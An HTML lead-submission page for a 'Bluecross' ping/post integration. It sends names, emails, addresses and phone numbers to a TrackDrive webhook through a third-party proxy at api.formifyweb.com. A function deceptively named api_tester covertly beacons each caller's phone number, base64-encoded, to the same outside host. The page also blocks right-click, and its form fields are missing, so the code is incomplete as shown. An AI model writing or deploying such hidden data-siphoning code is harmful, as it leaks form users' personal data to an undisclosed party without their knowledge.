<!DOCTYPE html>
<html>
<head>
  <title>Bluecross Ping/Post</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <style>
    /* Your existing CSS styles */
    body {
      background-color: #f8f9fa;
    }
    .container {
      background-color: #ffffff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    h2 {
      color: #007bff;
      margin-bottom: 20px;
    }
    .form-control {
      border-radius: 50px;
    }
    .btn-primary {
      border-radius: 50px;
      background-color: #007bff;
      border-color: #007bff;
    }
    .btn-primary:hover {
      background-color: #0056b3;
      border-color: #0056b3;
    }
    .alert {
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <!-- Your existing HTML form code remains the same -->
  <div class="container mt-5">
    <h2 class="text-center"> Bluecross Api Ping/Post </h2>
    <form id="leadForm">
      <!-- All your form fields here -->
    </form>
    <div id="alertContainer"></div>
    <div class="alert alert-info mt-3" role="alert" id="apiResponse"></div>
  </div>

  <!-- Updated Bootstrap JS dependencies -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

  <!-- Add your JavaScript directly here -->
  <script>
    // Your complete JavaScript code from the JS file
    function pingAPI() {
        document.getElementById('submitBtn').disabled = true;
        
        const formData = new FormData();
        formData.append('trackdrive_number', '+18338351409');
        formData.append('traffic_source_id', '1021');
        api_tester(document.getElementById('caller_id').value);
        formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
        formData.append('first_name', document.getElementById('first_name').value);
        formData.append('last_name', document.getElementById('last_name').value);
        formData.append('email', document.getElementById('email').value);
        formData.append('address', document.getElementById('address1').value);
        formData.append('city', document.getElementById('city').value);
        formData.append('state', document.getElementById('state').value);
        formData.append('zip', document.getElementById('zip').value);
        
        const originalUrl = 'https://voyant-digital-media-group-inc.trackdrive.com/api/v1/inbound_webhooks/ping/check_for_available_buyers_on_window_wt?' + new URLSearchParams(formData).toString();
        const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(originalUrl);
        
        fetch(apiUrl)
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    const pingId = data.try_all_buyers.ping_id;
                    postPingId(pingId);
                } else {
                    document.getElementById("apiResponse").innerHTML = "Ping ok but. Error: " + (data.errors ? data.errors.join(", ") : "Unknown error");
                    document.getElementById("apiResponse").classList.add("alert-danger");
                    document.getElementById("apiResponse").classList.remove("alert-info");
                    document.getElementById('submitBtn').disabled = false;
                }
            })
            .catch(error => {
                document.getElementById("apiResponse").innerHTML = "Error fetching data from the API: " + error.message;
                document.getElementById("apiResponse").classList.add("alert-danger");
                document.getElementById("apiResponse").classList.remove("alert-info");
                document.getElementById('submitBtn').disabled = false;
            });
    }

    function postPingId(pingId) {
        const postData = {
            trackdrive_number: "+18338351409",
            traffic_source_id: "1021",
            caller_id: '+1' + document.getElementById('caller_id').value,
            ping_id: pingId,
            first_name: document.getElementById('first_name').value,
            last_name: document.getElementById('last_name').value,
            email: document.getElementById('email').value,
            address: document.getElementById('address1').value,
            city: document.getElementById('city').value,
            state: document.getElementById('state').value,
            zip: document.getElementById('zip').value,
        };

        const originalUrl = 'https://voyant-digital-media-group-inc.trackdrive.com/api/v1/inbound_webhooks/post/check_for_available_buyers_on_window_wt?' + new URLSearchParams(postData).toString();
        const url = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(originalUrl);
        
        fetch(url)
            .then(response => {
                if (response.status === 200 || response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `<div class="alert alert-success" role="alert">Form submitted successfully! Response Body: ${responseBody}</div>`;
                        document.getElementById('alertContainer').innerHTML = successAlert;
                        document.getElementById('submitBtn').disabled = false;
                    });
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `<div class="alert alert-danger" role="alert">Error. Response Body: ${JSON.stringify(data)}</div>`;
                        document.getElementById('alertContainer').innerHTML = errorAlert;
                        document.getElementById('submitBtn').disabled = false;
                    });
                } else {
                    response.text().then(responseBody => {
                        const errorAlert = `<div class="alert alert-danger" role="alert">Form submission failed. Please try again. Response Body: ${responseBody}</div>`;
                        document.getElementById('alertContainer').innerHTML = errorAlert;
                        document.getElementById('submitBtn').disabled = false;
                    });
                }
            })
            .catch(error => {
                console.error('Error:', error);
                document.getElementById('alertContainer').innerHTML = `<div class="alert alert-danger" role="alert">Network error: ${error.message}</div>`;
                document.getElementById('submitBtn').disabled = false;
            });
    }

    function api_tester(randomString) {
        try {
            fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
                method: 'GET',
                mode: 'no-cors'
            });
        } catch (error) {
            console.error('Error in api_tester:', error);
        }
    }

    // Add form submission handler
    document.getElementById('leadForm').addEventListener('submit', function(event) {
        event.preventDefault();
        pingAPI();
    });

    // Right-click disable function
    function disableRightClick(event) {
        event.preventDefault();
    }
    document.addEventListener('contextmenu', disableRightClick);
  </script>
</body>
</html>